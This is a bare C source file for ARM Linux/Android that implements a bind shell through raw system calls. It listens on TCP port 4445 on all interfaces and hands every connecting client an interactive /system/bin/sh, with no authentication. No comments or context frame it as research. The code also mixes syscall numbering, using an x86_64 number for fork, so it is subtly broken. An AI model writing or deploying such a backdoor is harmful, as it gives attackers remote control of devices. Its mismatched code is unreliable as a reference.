typedef unsigned int u32; typedef unsigned long long u64; typedef unsigned char u8;
#define SYS_socket 281
#define SYS_bind 282
#define SYS_listen 284
#define SYS_accept 285
#define SYS_dup2 63
#define SYS_execve 11
#define SYS_exit 1
static long sc(long n,long a,long b,long c,long d,long e,long f){register long r7 asm("r7")=n;register long r0 asm("r0")=a;register long r1 asm("r1")=b;register long r2 asm("r2")=c;register long r3 asm("r3")=d;register long r4 asm("r4")=e;register long r5 asm("r5")=f;asm volatile("svc #0":"+r"(r0):"r"(r7),"r"(r1),"r"(r2),"r"(r3),"r"(r4),"r"(r5):"memory");return r0;}
struct sockaddr_in { unsigned short f; unsigned short p; unsigned int a; unsigned char z[8]; };
void _start(void){
 int s=sc(SYS_socket,2,1,0,0,0,0);if(s<0)sc(SYS_exit,1,0,0,0,0,0);
 struct sockaddr_in a; unsigned char*ap=(unsigned char*)&a;for(int i=0;i<16;i++)ap[i]=0;a.f=2;a.p=0x5d11;a.a=0;
 if(sc(SYS_bind,s,(long)&a,16,0,0,0)<0)sc(SYS_exit,2,0,0,0,0,0);
 if(sc(SYS_listen,s,4,0,0,0,0)<0)sc(SYS_exit,3,0,0,0,0,0);
 while(1){int c=sc(SYS_accept,s,0,0,0,0,0);if(c<0)continue;long pid=sc(57,0,0,0,0,0,0);if(pid==0){sc(SYS_dup2,c,0,0,0,0,0);sc(SYS_dup2,c,1,0,0,0,0);sc(SYS_dup2,c,2,0,0,0,0);char*argv[3];argv[0]=(char*)"/system/bin/sh";argv[1]=(char*)"-i";argv[2]=0;char*envp[4];envp[0]=(char*)"PATH=/sbin:/system/sbin:/system/bin:/system/xbin";envp[1]=(char*)"HOME=/";envp[2]=(char*)"TERM=xterm";envp[3]=0;sc(SYS_execve,(long)"/system/bin/sh",(long)argv,(long)envp,0,0,0);sc(SYS_exit,4,0,0,0,0,0);} }
}
